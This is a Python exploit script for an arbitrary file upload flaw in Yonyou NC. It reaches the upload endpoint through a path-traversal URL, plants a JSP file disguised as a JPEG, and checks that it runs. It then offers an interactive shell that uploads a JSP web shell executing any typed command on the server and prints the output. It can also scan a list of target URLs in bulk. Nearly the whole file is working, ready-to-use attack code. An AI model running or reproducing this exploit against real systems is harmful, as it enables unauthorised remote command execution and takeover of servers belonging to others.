import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
import urllib.request
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = url+"/mp/initcfg/../uploadControl/uploadFile"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
    }
    data="""------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="file"; filename="sys_log.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<% out.println("HelloWorldTest1");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="submit"\r\n\r\n上传\r\n------WebKitFormBoundarygcflwtei--""".encode('utf-8')
    try:
        response = urllib.request.Request(target, headers=headers, data=data, method="POST", unverifiable=True)
        res = urllib.request.urlopen(response)
        status_code = res.getcode()
        content = res.read().decode()
        if status_code == 200 and 'forbidden' in content:
            result_url = urljoin(url,'/mp/uploadFileDir/sys_log.jsp')
            result_response = requests.get(result_url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"})
            if result_response.status_code == 200 and 'HelloWorldTest' in result_response.text:
                print(f"\033[31mDiscovered:{url}: YongYouNC_uploadFile_ArbitraryFileFUpload\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = url + "/mp/initcfg/../uploadControl/uploadFile"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                data = """------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="file"; filename="sys_loger.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<% java.io.InputStream in = Runtime.getRuntime().exec("replace").getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="submit"\r\n\r\n上传\r\n------WebKitFormBoundarygcflwtei--"""
                data = data.replace('replace',command).encode('utf-8')
                try:
                    response = urllib.request.Request(target, headers=headers, data=data, method="POST",unverifiable=True)
                    res = urllib.request.urlopen(response)
                    status_code = res.getcode()
                    content = res.read().decode()
                    if status_code == 200 and 'forbidden' in content:
                        result_url = urljoin(url, '/mp/uploadFileDir/sys_loger.jsp')
                        result_response = requests.get(result_url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"})
                        if result_response.status_code == 200:
                            print(result_response.text)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")